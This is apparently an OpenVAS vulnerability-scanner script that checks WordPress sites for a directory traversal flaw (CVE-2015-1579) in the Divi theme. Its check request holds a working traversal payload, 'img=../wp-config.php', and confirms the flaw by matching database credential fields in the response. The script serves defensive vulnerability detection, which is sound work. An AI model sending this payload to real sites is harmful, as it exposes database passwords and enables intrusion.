CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805343" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2015-1579" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-03-06 11:19:45 +0530 (Fri, 06 Mar 2015)" );
	script_name( "WordPress Divi Theme Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  Divi Theme and is prone to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not." );
	script_tag( name: "insight", value: "Flaw is due to the 'wp-admin/admin-ajax.php'
  scripts are not properly sanitizing user input, specifically path traversal style
  attacks (e.g. '../') via the 'img' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to download arbitrary files." );
	script_tag( name: "affected", value: "WordPress Divi Theme" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36039/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-admin/admin-ajax.php?action=" + "revslider_show_image&img=../wp-config.php";
sndReq = http_get( item: url, port: http_port );
rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
if(http_vuln_check( port: http_port, url: url, check_header: FALSE, pattern: "DB_NAME", extra_check: make_list( "DB_USER",
	 "DB_PASSWORD" ) )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

